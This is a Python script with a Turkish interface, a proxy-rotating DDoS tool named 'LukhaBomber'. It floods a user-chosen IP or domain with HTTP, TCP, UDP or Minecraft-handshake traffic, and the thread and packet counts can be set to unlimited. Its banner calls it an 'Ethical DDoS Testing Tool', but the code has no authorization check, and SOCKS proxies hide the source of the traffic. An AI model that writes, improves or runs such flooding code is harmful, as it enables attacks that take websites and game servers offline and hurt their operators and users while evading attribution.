#!/usr/bin/python3
import os
import sys
import time
import random
import socks
import socket
import threading
from concurrent.futures import ThreadPoolExecutor

BANNER = """
\033[91m
  _      _____ _   _ _______ _____  
 | |    |_   _| \ | |__   __|  __ \ 
 | |      | | |  \| |  | |  | |__) |
 | |      | | | . ` |  | |  |  ___/ 
 | |____ _| |_| |\  |  | |  | |     
 |______|_____|_| \_|  |_|  |_|     
\033[0m
\033[93m>>> Ethical DDoS Testing Tool <<<\033[0m
"""

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X)",
    "Mozilla/5.0 (Linux; Android 10; SM-A505FN)"
]

class LukhaBomber:
    def __init__(self, target, port, threads, total_requests, proxy_type, attack_target):
        self.target = target
        self.port = port
        self.threads = threads
        self.total_requests = total_requests
        self.proxy_type = proxy_type.lower()
        self.attack_target = attack_target
        self.counter = 0
        self.success = 0
        self.failed = 0
        self.running = True
        self.lock = threading.Lock()
        self.proxies = self.load_proxies()
        if not self.proxies:
            print("\033[91mProxy listesi boş veya bulunamadı!\033[0m")
            sys.exit(1)

    def load_proxies(self):
        try:
            with open("proxy.txt", "r") as f:
                proxies = [line.strip() for line in f if ":" in line]
            return proxies
        except FileNotFoundError:
            print("\033[91mproxy.txt dosyası bulunamadı!\033[0m")
            sys.exit(1)

    def create_socket(self, proxy_ip, proxy_port):
        s = socks.socksocket()
        if self.proxy_type == "socks5":
            s.set_proxy(socks.SOCKS5, proxy_ip, int(proxy_port))
        else:
            s.set_proxy(socks.SOCKS4, proxy_ip, int(proxy_port))
        s.settimeout(5)
        return s

    def http_flood(self):
        while self.running and (self.total_requests == 0 or self.counter < self.total_requests):
            proxy = random.choice(self.proxies)
            ip, port = proxy.split(":")
            try:
                s = self.create_socket(ip, port)
                s.connect((self.target, self.port))
                headers = [
                    "GET / HTTP/1.1",
                    f"Host: {self.target}",
                    f"User-Agent: {random.choice(USER_AGENTS)}",
                    "Accept: */*",
                    "Connection: keep-alive"
                ]
                s.send(("\r\n".join(headers) + "\r\n\r\n").encode())
                with self.lock:
                    self.success += 1
            except:
                with self.lock:
                    self.failed += 1
            finally:
                with self.lock:
                    self.counter += 1
                try:
                    s.close()
                except:
                    pass

    def tcp_flood(self):
        while self.running and (self.total_requests == 0 or self.counter < self.total_requests):
            proxy = random.choice(self.proxies)
            ip, port = proxy.split(":")
            try:
                s = self.create_socket(ip, port)
                s.connect((self.target, self.port))
                s.send(random._urandom(1024))
                with self.lock:
                    self.success += 1
            except:
                with self.lock:
                    self.failed += 1
            finally:
                with self.lock:
                    self.counter += 1
                try:
                    s.close()
                except:
                    pass

    def udp_flood(self):
        while self.running and (self.total_requests == 0 or self.counter < self.total_requests):
            proxy = random.choice(self.proxies)
            ip, port = proxy.split(":")
            try:
                s = socks.socksocket(socket.AF_INET, socket.SOCK_DGRAM)
                if self.proxy_type == "socks5":
                    s.set_proxy(socks.SOCKS5, ip, int(port))
                else:
                    s.set_proxy(socks.SOCKS4, ip, int(port))
                s.settimeout(5)
                s.sendto(random._urandom(1024), (self.target, self.port))
                with self.lock:
                    self.success += 1
            except:
                with self.lock:
                    self.failed += 1
            finally:
                with self.lock:
                    self.counter += 1

    def minecraft_flood(self):
        while self.running and (self.total_requests == 0 or self.counter < self.total_requests):
            proxy = random.choice(self.proxies)
            ip, port = proxy.split(":")
            try:
                s = self.create_socket(ip, port)
                s.connect((self.target, self.port))
                # Minecraft handshake + ping packet (basit örnek)
                packet = b"\x00\x00\x0f\x00\x04" + bytes(self.target, 'utf-8') + self.port.to_bytes(2, 'big') + b"\x01"
                s.send(packet)
                with self.lock:
                    self.success += 1
            except:
                with self.lock:
                    self.failed += 1
            finally:
                with self.lock:
                    self.counter += 1
                try:
                    s.close()
                except:
                    pass

    def print_stats(self):
        while self.running:
            os.system('cls' if os.name == 'nt' else 'clear')
            print(BANNER)
            print(f"\033[94mHedef: \033[0m{self.target}:{self.port}")
            print(f"\033[94mSaldırı Tipi: \033[0m{self.attack_target}")
            print(f"\033[94mThread Sayısı: \033[0m{self.threads}")
            print(f"\033[94mGönderilen Paket: \033[0m{self.counter}")
            print(f"\033[92mBaşarılı Paket: \033[0m{self.success}")
            print(f"\033[91mBaşarısız Paket: \033[0m{self.failed}")
            print("\033[93mCtrl+C ile durdurabilirsiniz...\033[0m")
            time.sleep(1)

    def start(self):
        stats_thread = threading.Thread(target=self.print_stats)
        stats_thread.daemon = True
        stats_thread.start()

        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            for _ in range(self.threads):
                if self.attack_target == "http":
                    executor.submit(self.http_flood)
                elif self.attack_target == "tcp":
                    executor.submit(self.tcp_flood)
                elif self.attack_target == "udp":
                    executor.submit(self.udp_flood)
                elif self.attack_target == "minecraft":
                    executor.submit(self.minecraft_flood)
                else:
                    print("\033[91mGeçersiz saldırı türü!\033[0m")
                    self.running = False
                    break

            while self.running and (self.total_requests == 0 or self.counter < self.total_requests):
                time.sleep(0.5)

        print("\n\033[92mSaldırı durduruldu.\033[0m")
        print(f"Toplam paket: {self.counter}")
        print(f"Başarılı: {self.success}")
        print(f"Başarısız: {self.failed}")

def main():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(BANNER)

    target = input("Hedef IP/Domain: ").strip()
    port_input = input("Port (default 80): ").strip()
    port = int(port_input) if port_input else 80

    threads_input = input("Thread sayısı (default 200): ").strip()
    threads = int(threads_input) if threads_input else 200

    total_requests_input = input("Toplam gönderilecek paket sayısı (0 = sonsuz): ").strip()
    if total_requests_input == "0":
        total_requests = 0
    elif total_requests_input.isdigit() and int(total_requests_input) > 0:
        total_requests = int(total_requests_input)
    else:
        print("\033[91mGeçersiz paket sayısı!\033[0m")
        sys.exit(1)

    print("\nHedef türü seçin:")
    print("1. Site (HTTP Flood)")
    print("2. TCP Flood")
    print("3. UDP Flood")
    print("4. Minecraft Sunucusu")
    attack_choice = input("Seçiminiz (1-4): ").strip()

    if attack_choice == "1":
        attack_target = "http"
    elif attack_choice == "2":
        attack_target = "tcp"
    elif attack_choice == "3":
        attack_target = "udp"
    elif attack_choice == "4":
        attack_target = "minecraft"
        if port == 80:
            port = 25565
    else:
        print("\033[91mGeçersiz seçim!\033[0m")
        sys.exit(1)

    proxy_type = input("Proxy tipi (socks4 veya socks5, default socks5): ").strip().lower() or "socks5"

    try:
        bomber = LukhaBomber(target, port, threads, total_requests, proxy_type, attack_target)
    except Exception as e:
        print(f"\033[91mHata oluştu: {e}\033[0m")
        sys.exit(1)

    print("\nSaldırı başlatılıyor...")
    try:
        bomber.start()
    except KeyboardInterrupt:
        bomber.running = False
        print("\n\033[93mSaldırı durduruluyor...\033[0m")
        time.sleep(1)

if __name__ == "__main__":
    main()
